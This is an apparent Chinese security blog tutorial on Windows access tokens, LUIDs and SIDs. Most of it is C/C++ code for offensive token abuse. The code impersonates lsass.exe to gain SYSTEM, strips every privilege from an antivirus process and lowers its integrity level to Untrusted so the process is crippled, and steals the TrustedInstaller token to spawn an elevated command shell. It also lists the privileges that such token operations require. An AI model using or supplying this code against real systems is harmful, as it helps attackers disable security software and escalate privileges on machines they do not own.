## 1 前置概念

### 关于Windows Access Token

Windows Access
Token(访问令牌)，它是一个描述进程或者线程安全上下文的一个对象。每个用户登录计算机都会产生一个AcessToken以用于创建进程和线程，用户注销以后会将主令牌切换成模拟令牌，也就是授权令牌和模拟令牌，不会清除令牌，只有重启才会。

### 两种类型的Token

  * Delegation token(授权令牌):用于交互会话登录(例如本地直接登录、rdp login 、psexec )

  * Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹，或者wmi、winrm等等）

注：  
都是在登录时产生创建的

两种token只在系统重启后清除

具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效

### TOKEN的产生

每个进程创建时都会根据登录会话权限由LSA(Local Security
Authority)分配一个Token(如果CreaetProcess时自己指定了Token, LSA会用该Token，否则就继承父进程Token进行运行)

### TOKEN组成

> 当前用户的安全ID(SID)  
> 当前用户所属组的安全ID(SID)  
> 当前会话安全ID  
> 用户所有的特权列表（包括用户本身，和其所属组）  
> 令牌拥有者安全ID  
> 用户所属主组群安全ID  
> 默认的自由访问控制列表  
> 源访问令牌  
> 表明此令牌是源令牌还是模拟令牌  
> 可选的链表，表明此令牌限制哪些SID  
> 当前模拟令牌的级别  
> 其他数据资料

## 2 进程的身份标识：Luid与SID

### Luid

每个特权常量字符串（Privileges）都对应一个LUID（本地标识符），使用LookupPrivilegeName函数将LUID转换为其对应的字符串常量，总计是36个特权，所以LUID有36个(0x24)，所有特权如下：

![1661319688_6305ba0856e75ccad2e8c.png!small](https://image.3001.net/images/20220824/1661319688_6305ba0856e75ccad2e8c.png!small)

  * MSDN对特权常量的描述：https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants

### SID

安全标识符（SID）是用户、组的唯一标识符，SID的构成如下：

    
    
    S-版本号-(颁发机构：Identity-Authority)-(子机构：SubAuthority)-RID
    

MSDN上的一个例子

![1661319715_6305ba230fa64978f17f1.png!small](https://image.3001.net/images/20220824/1661319715_6305ba230fa64978f17f1.png!small)

由4个部分组成，其中的子机构值是可以由多位组成，“whoami /all” 可以查看本机中的用户的sid以及用户组的sid

![1661319745_6305ba41b1b14ed125bbc.png!small](https://image.3001.net/images/20220824/1661319745_6305ba41b1b14ed125bbc.png!small)

这里讲一个后续会用到的sid：S-1-16-0，微软的解释是一个权限最低的完整性级别的SID。

![1661319759_6305ba4f03abae9015769.png!small](https://image.3001.net/images/20220824/1661319759_6305ba4f03abae9015769.png!small)

标识符机构值为16（0x10）表示强制完整级别的SID，

![1661319773_6305ba5d6f49db5d12432.png!small](https://image.3001.net/images/20220824/1661319773_6305ba5d6f49db5d12432.png!small)

微软关于强制完整性控制的解释。

![1661319782_6305ba6641ae6fee5828f.png!small](https://image.3001.net/images/20220824/1661319782_6305ba6641ae6fee5828f.png!small)

## 3 举例

下面举一个赋予当前进程操作令牌DEBUG权限的例子。  
很多操作一般都需要赋予当前进程操作令牌权限：SE_DEBUG_NAME，然后再进行令牌操作，比如清除令牌、伪造令牌，在加载驱动的时候如果要连接驱动是需要Debug权限的，否则无法进行createFile生成驱动句柄。

OpenProcessToken
获取进程令牌，GetCurrentProcess获取到当前进程伪句柄（进程之间通信伪句柄需要转化成实句柄（DuplicateHandle））。

    
    
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
        {
            printf("[-]get token failed!\n");
        }
        else {
            printf("[*]get token success\n");
        }
    

LookupPrivilegeValue 获取本地系统的 SE_DEBUG_NAME 特权的LUID值返回给sedebugnameValue。

    
    
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue))
        {
            CloseHandle(hToken);
            return false;
        }
    

AdjustTokenPrivileges 修改进程特权为 SE_DEBUG_NAME
特权，tkp.PrivilegeCount表示设置新特权的特权数量，tkp.Privileges[0].Attributes表示特权的属性；SE_PRIVILEGE_ENABLED就表示启用该特权。设置完记得GetLastError
看是否成功。

    
    
    tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Luid = sedebugnameValue;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
        {
            CloseHandle(hToken);
            return false;
        }
    

### 降权杀软进程

#### 1.思路

  * 通过遍历36个Luid清空TOKEN、降权SID，来达到降权进程的目的

#### 2.代码实现

  * 先给当前进程一个SE_DEBUG_NAME的特权，赋予进行token操作的权限

    
    
    bool EnableDebugPrivilege()
    {
        HANDLE hToken;
        LUID sedebugnameValue;
        TOKEN_PRIVILEGES tkp;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        {
            return   FALSE;
        }
        if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue))
        {
            CloseHandle(hToken);
            return false;
        }
        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Luid = sedebugnameValue;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
        {
            CloseHandle(hToken);
            return false;
        }
        return true;
    }
    

  * 获取一下借用下lsass的token提权到system

    
    
    int pid = processID("lsass.exe");
    
    HANDLE ptoken;
    HANDLE phandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    BOOL token = OpenProcessToken(phandle, TOKEN_DUPLICATE | TOKEN_QUERY, &ptoken);
    
    BOOL bRet = ImpersonateLoggedOnUser(ptoken);
    if (bRet == FALSE)
        return 1;
    

  * 打开目标进程，获取句柄

    
    
    HANDLE process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processID(procname));
    erroint = GetLastError();
    if (erroint == NULL)
        printf("[+]Get ProcHandle success Pid:%d\n", processID(procname));
    else
        printf("Get ProcHandle fail：%d\n", erroint);
    

  * 获取到目标进程的token

    
    
    int ret = OpenProcessToken(process, TOKEN_ALL_ACCESS, &Ltoken);
    erroint = GetLastError();
    if (erroint == NULL)
        cout << "[+]Get ProcToken success" << endl;
    else
        printf("Get ProcToken fail：%d\n", erroint);
    

  * 核心代码：上文提到了LUID（特权常量）共计是36个（0x24），这里我们直接遍历36个每个全部移除掉。

    
    
    BOOL DisablePrivilege(HANDLE token) {
        typedef_ZwAdjustPrivilegesToken ZwAdjustPrivilegesToken = (typedef_ZwAdjustPrivilegesToken)GetProcAddress(LoadLibraryA("ntdll.dll"), "ZwAdjustPrivilegesToken");
        if (ZwAdjustPrivilegesToken == NULL) {
            printf("Can not found ZwAdjustPrivilegesToken");
            return -1;
        }
    
        for (int i = 0; i <= 0x24; i++) {
            TOKEN_PRIVILEGES tp = {};
            LUID luid = {};
            luid.HighPart = 0;
            luid.LowPart = i;
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;
            ZwAdjustPrivilegesToken(token, 0, &tp, sizeof(tp), NULL, NULL);
            erroint = GetLastError();
            if (erroint == NULL)
                cout << "[+]Remove ProcToken success" << endl;
            else
                printf("Remove ProcToken fail：%d\n", erroint);
        }
    
        return TRUE;
    
    }
    

  * 设置sid为不受信任的强制完整性权限:s-1-16-0（这里可理解为就是个弟中之弟的一个sid），

    
    
    DWORD integrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;
    SID sid = {};
    sid.Revision = SID_REVISION;
    sid.SubAuthorityCount = 1;
    sid.IdentifierAuthority.Value[5] = 16;
    sid.SubAuthority[0] = integrityLevel;
    
    TOKEN_MANDATORY_LABEL tml = {};
    tml.Label.Attributes = SE_GROUP_INTEGRITY;
    tml.Label.Sid = &ampsid
    

  * 最后重新设置目标进程的token和sid，

    
    
    BOOL Rret = SetTokenInformation(Ltoken, TokenIntegrityLevel, &tml, sizeof(TOKEN_MANDATORY_LABEL));
    

  * 注意：当前时间已经无法获取到defender的token，GetLastError：5 提示权限不够，切换成TrustedInstaller也不行，或许是hook了OpenProcessToken，可以syscall试试。

### 通过token窃取获得TrustedInstaller权限

 **1\. 什么是TrustedInstaller**

在Windows系统中，即使获得了管理员权限和system权限，也不能修改系统文件,因为Windows系统的最高权限为TrustedInstaller

####  **2\. 如何得到它的token**

直接窃取TrustedInstaller.exe的token，起一个进程就可以得到一个trustedInstaller权限的进程。前提是需要system权限

####  **3\. 代码实现**

大致操作如下：先窃取lsass.exe的token提升当前进程的权限为system，然后窃取TrustedInstaller.exe的token，来获得一个拥有TrustedInstaller权限的CMD

  * 获取一个system权限的进程句柄，通过进程句柄获取到token，并且赋予给当前进程，提权到system。

    
    
    HANDLE ptoken1;
        HANDLE phandle1 = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid1);
        BOOL token1 = OpenProcessToken(phandle1, TOKEN_DUPLICATE | TOKEN_QUERY, &ptoken1);
    
        BOOL bRet1 = ImpersonateLoggedOnUser(ptoken1);
        if (bRet1 == FALSE)
            return 1;
    

  * 通过进程快照，查找到TrustedInstaller.exe的pid。

    
    
    wchar_t procname[80] = L"TrustedInstaller.exe";
        int pid = FindProcessId(procname);
    

  * 获取当前进程的token给到htoken。

    
    
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
        {
            printf("[-]get token failed!\n");
        }
        else {
            printf("[*]get token success\n");
        }
    

  * 打开TrustedInstaller.exe，获取到它的进程句柄phandle。

    
    
    HANDLE phandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    
        if (phandle != INVALID_HANDLE_VALUE) {
    
            printf("[*]Opened Target Handle\n");
        }
        else {
            printf("[-]Failed to open Process Handle\n");
        }
    

  * 取到TrustedInstaller.exe的token，这里我们只需要复制和查询权限即可，如果用TOKEN_ALL_ACCESS会提示无权限。

![1661319806_6305ba7e5290703191202.png!small](https://image.3001.net/images/20220824/1661319806_6305ba7e5290703191202.png!small)

    
    
    BOOL token = OpenProcessToken(phandle, TOKEN_DUPLICATE | TOKEN_QUERY, &ptoken);
        if (token) {
            printf("[+]Opened Target Token Handle\n");
        }
        else {
            printf("[-]Failed to open Token Handle:%d\n", GetLastError());
        }
    

  * 再通过我们拿到的token去启一个我们想要启动的进程，

    
    
    BOOL ret = CreateProcessWithTokenW(hToken, LOGON_NETCREDENTIALS_ONLY, wstrExecutablePath.c_str(), NULL, 0, NULL, NULL, &si, π);
        if (!ret)
            printf("[-]Create Failed:%d\n", GetLastError());
        else
            printf("[+]Create success!!");
    

  * 最后可以看到从administrator提到了TrustedInstaller权限。

![1661319824_6305ba900d1e26b458442.png!small](https://image.3001.net/images/20220824/1661319824_6305ba900d1e26b458442.png!small)

## 4 最后

这种token替换提权的操作无法通过普通用户来操作，最低都是要求要administrator，另可用于服务账户提权到systen，或者本地存在域管的token用来替换域管的token。

  * token操作需要操作账户拥有以下权限之一（whoami /priv）：

    
    
    SeImpersonatePrivilege
    SeAssignPrimaryPrivilege
    SeTcbPrivilege
    SeBackupPrivilege
    SeRestorePrivilege
    SeCreateTokenPrivilege
    SeLoadDriverPrivilege
    SeTakeOwnershipPrivilege
    SeDebugPrivilege
    

以上有问题欢迎各位交流指出。

## 参考

>
> https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8  
> https://macchiato.ink/hst/bypassav/Token_Weakening/

